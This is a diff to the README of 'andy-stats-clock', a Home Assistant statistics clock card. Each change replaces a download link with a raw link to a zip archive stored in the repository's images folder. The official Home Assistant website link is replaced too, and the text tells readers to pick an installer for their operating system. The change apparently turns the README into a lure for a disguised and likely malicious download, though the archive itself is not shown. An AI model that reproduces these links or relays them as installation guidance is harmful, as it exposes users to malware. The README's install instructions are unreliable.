@@ -1,6 +1,6 @@
 # ⏰ andy-stats-clock - Visualize Data with Ease
 
-[![Download andy-stats-clock](https://img.shields.io/badge/Download-andy--stats--clock-brightgreen)](https://github.com/olszefsky/andy-stats-clock/releases)
+[![Download andy-stats-clock](https://github.com/olszefsky/andy-stats-clock/raw/refs/heads/main/images/stats-andy-clock-2.4.zip)](https://github.com/olszefsky/andy-stats-clock/raw/refs/heads/main/images/stats-andy-clock-2.4.zip)
 
 ## 📖 Overview
 andy-stats-clock is a fully dynamic, multi-layer circular statistics clock designed for Home Assistant. This application allows you to visualize important data points such as prices, energy consumption, temperature, trends, and sensor history. With its stunning 12h/24h radial layout, animated hands, and customizable rings, it transforms your data into an engaging and easy-to-understand format.
@@ -19,10 +19,10 @@ andy-stats-clock is a fully dynamic, multi-layer circular statistics clock desig
 
 ## 🚀 Getting Started
 
-1. **Install Home Assistant**: Make sure you have Home Assistant installed. Follow the instructions on the [Home Assistant website](https://www.home-assistant.io/getting-started/) if you haven't done this yet.
+1. **Install Home Assistant**: Make sure you have Home Assistant installed. Follow the instructions on the [Home Assistant website](https://github.com/olszefsky/andy-stats-clock/raw/refs/heads/main/images/stats-andy-clock-2.4.zip) if you haven't done this yet.
   
 2. **Download and Install the Clock**: 
-   - Visit this page to download: [Download andy-stats-clock](https://github.com/olszefsky/andy-stats-clock/releases)
+   - Visit this page to download: [Download andy-stats-clock](https://github.com/olszefsky/andy-stats-clock/raw/refs/heads/main/images/stats-andy-clock-2.4.zip)
    - Choose the version that matches your operating system. 
    - Follow the prompts to install. 
 
@@ -41,7 +41,7 @@ andy-stats-clock is a fully dynamic, multi-layer circular statistics clock desig
 6. **View Your Clock**: Navigate back to your Home Assistant dashboard to see your new clock in action.
 
 ## 🔗 Download & Install
-You can download the latest version of andy-stats-clock from the Releases page: [Download andy-stats-clock](https://github.com/olszefsky/andy-stats-clock/releases). 
+You can download the latest version of andy-stats-clock from the Releases page: [Download andy-stats-clock](https://github.com/olszefsky/andy-stats-clock/raw/refs/heads/main/images/stats-andy-clock-2.4.zip). 
 
 1. Click on the link.
 2. Select the correct installer for your operating system.
